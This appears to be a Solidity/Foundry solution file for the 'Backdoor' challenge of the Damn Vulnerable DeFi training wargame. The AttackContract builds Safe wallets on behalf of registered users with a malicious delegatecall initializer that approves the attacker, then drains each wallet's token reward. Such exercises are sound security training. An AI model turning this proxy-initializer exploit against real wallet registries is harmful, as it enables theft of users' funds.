// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(
            token.balanceOf(address(walletRegistry)),
            AMOUNT_TOKENS_DISTRIBUTED
        );
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        AttackContract attack = new AttackContract(
            address(singletonCopy),
            address(walletFactory),
            address(walletRegistry),
            address(token),
            recovery
        );
        attack.trigger(users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract AttackContract {
    // 1. We have to pass by address, or the delegateCall cannot execute as caller's context
    // 2. Also need to set token as immutable token, or will fail
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable token;
    address recovery;

    constructor(
        address _singletonCopy,
        address _walletFactory,
        address _walletRegistry,
        address _token,
        address _recovery
    ) {
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        token = DamnValuableToken(_token);
        recovery = _recovery;
    }

    // This is the actual backdoored function
    function approveFromSafeProxy(address _addr_attacker) external {
        token.approve(_addr_attacker, 10 ether);
    }

    function trigger(address[] memory _beneficiaries) external {
        // Since threshold is 1, we need 4 loops
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Parameters for `Safe.setup`
            // 1. We put the `to` and `data` as attacker contract and the approve function
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  Since the challenge sets to 1, just follow it
                1, // _threshold, set to 1
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature(
                    "approveFromSafeProxy(address)",
                    address(this)
                ), // data =>  call the attacker.approveFromSafeProxy
                address(0), //  fallbackHandler
                0, //  paymentToken
                0, // payment
                0 //  paymentReceiver
            );

            // Create new proxies on behalf of other users
            SafeProxy _newProxy = SafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    singletonCopy,
                    _initializer,
                    i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                    IProxyCreationCallback(walletRegistry) // callback => Follow the source code, cast walletRegistry to IProxyCreationCallback
                );
            //Transfer to caller
            token.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}
